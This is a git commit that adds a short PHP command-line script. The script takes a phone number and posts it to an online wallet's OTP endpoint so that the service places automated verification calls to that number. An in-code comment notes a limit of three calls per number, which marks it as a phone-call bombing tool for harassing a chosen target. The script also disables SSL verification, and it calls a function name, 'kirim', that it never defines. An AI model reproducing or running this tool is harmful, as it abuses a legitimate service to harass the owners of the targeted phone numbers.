1c38ce2ea326872081de5cdbc04fb308b9207e32
M-Rangga <maniabis22@gmail.com>
2020-06-04 16:46:56 +0700

    first commit

---
+++ celler.php
@@ -0,0 +1,19 @@
+<?php
+// Limit 3x Telpon Setiap Per Nomor Yaww!!
+function send($phone){
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, "https://www.tokocash.com/oauth/otp");                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_HEADER, true);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, "msisdn=$phone&accept=call");                        $asw = curl_exec($ch);
+        curl_close($ch);
+                echo $asw."\n";
+}
+echo "COPYRIGHT ; Yuuta\n\n";
+echo "Input\nNomor : ";
+$nomor = trim(fgets(STDIN));
+$execute = kirim($nomor);
+print $execute;
+?>
